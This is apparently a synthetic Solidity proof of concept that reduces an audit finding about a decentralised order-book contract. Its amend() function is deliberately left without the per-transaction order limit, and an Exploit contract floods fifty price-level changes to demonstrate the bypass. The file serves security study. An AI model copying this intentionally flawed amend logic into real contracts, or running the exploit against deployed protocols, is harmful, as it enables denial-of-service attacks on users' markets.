// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    GTE CLOB — amend() bypasses maxLimitsPerTx DOS protection
    (Code4rena 2025-07-gte-spot-clob-and-router, finding #64871 / H-03)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: postLimitOrder calls incrementLimitsPlaced (enforcing
    maxLimitsPerTx), but amend() never does — even when the amendment moves
    the order to a new price (effectively a new book level). An attacker can
    flood unlimited price-level changes in one tx after posting a single order.

    Blamed path: CLOB.sol amend() missing incrementLimitsPlaced @ 9f06332e.
//////////////////////////////////////////////////////////////////////////*/

contract CLOB {
    uint8 public maxLimitsPerTx;
    mapping(address => uint8) public limitsPlaced;
    mapping(uint256 => Order) public orders;
    uint256 public nextOrderId = 1;

    // book occupancy: price => order count (demonstrates flooding)
    mapping(uint256 => uint256) public ordersAtPrice;
    uint256 public distinctPricesTouched;
    mapping(uint256 => bool) public priceSeen;

    struct Order {
        address owner;
        uint256 price;
        uint256 amount;
        bool exists;
    }

    error LimitsPlacedExceedsMax();
    error Unauthorized();
    error OrderMissing();

    constructor(uint8 maxLimits) {
        maxLimitsPerTx = maxLimits;
    }

    function incrementLimitsPlaced(address account) internal {
        uint8 placed = limitsPlaced[account];
        if (placed >= maxLimitsPerTx) revert LimitsPlacedExceedsMax();
        limitsPlaced[account] = placed + 1;
    }

    function postLimitOrder(address account, uint256 price, uint256 amount) external returns (uint256 orderId) {
        // Max limits per tx is enforced on the caller
        incrementLimitsPlaced(msg.sender);

        orderId = nextOrderId++;
        orders[orderId] = Order({owner: account, price: price, amount: amount, exists: true});
        _touchPrice(price);
    }

    function amend(address account, uint256 orderId, uint256 newPrice, uint256 newAmount) external {
        // @> VULN: no call to incrementLimitsPlaced() — price/side change is free unlimited
        // FIX: if (order.price != newPrice) incrementLimitsPlaced(msg.sender);

        Order storage order = orders[orderId];
        if (!order.exists) revert OrderMissing();
        if (order.owner != account) revert Unauthorized();

        uint256 oldPrice = order.price;
        if (oldPrice != newPrice) {
            // effectively creates a new order book position
            if (ordersAtPrice[oldPrice] > 0) ordersAtPrice[oldPrice] -= 1;
            order.price = newPrice;
            _touchPrice(newPrice);
        }
        order.amount = newAmount;
    }

    function _touchPrice(uint256 price) internal {
        ordersAtPrice[price] += 1;
        if (!priceSeen[price]) {
            priceSeen[price] = true;
            distinctPricesTouched += 1;
        }
    }

    function resetTxLimits(address account) external {
        limitsPlaced[account] = 0;
    }
}

contract Exploit {
    CLOB public clob; // CREATE 1 — vulnerable
    uint256 public orderId;
    uint256 public amendsDone;
    bool public bypassWorked;

    constructor() {
        // Protocol DOS guard: max 2 new limits per tx
        clob = new CLOB(2);
    }

    function run() external {
        // Post 2 orders — hits maxLimitsPerTx (cannot post a 3rd)
        orderId = clob.postLimitOrder(address(this), 100, 1e18);
        clob.postLimitOrder(address(this), 101, 1e18);

        // Control: third post reverts
        bool thirdPostBlocked = false;
        try clob.postLimitOrder(address(this), 102, 1e18) {
            thirdPostBlocked = false;
        } catch {
            thirdPostBlocked = true;
        }
        require(thirdPostBlocked, "maxLimitsPerTx should block 3rd post");

        // Attack: amend first order across many prices — no limit increment
        uint256 startDistinct = clob.distinctPricesTouched();
        for (uint256 i = 0; i < 50; i++) {
            clob.amend(address(this), orderId, 200 + i, 1e18);
            amendsDone++;
        }
        uint256 endDistinct = clob.distinctPricesTouched();

        bypassWorked = amendsDone == 50 && endDistinct > startDistinct + 40;
        require(bypassWorked, "harm not demonstrated: amend flood should bypass maxLimitsPerTx");
        require(clob.limitsPlaced(address(this)) == 2, "limits counter must stay at posts only");
    }
}
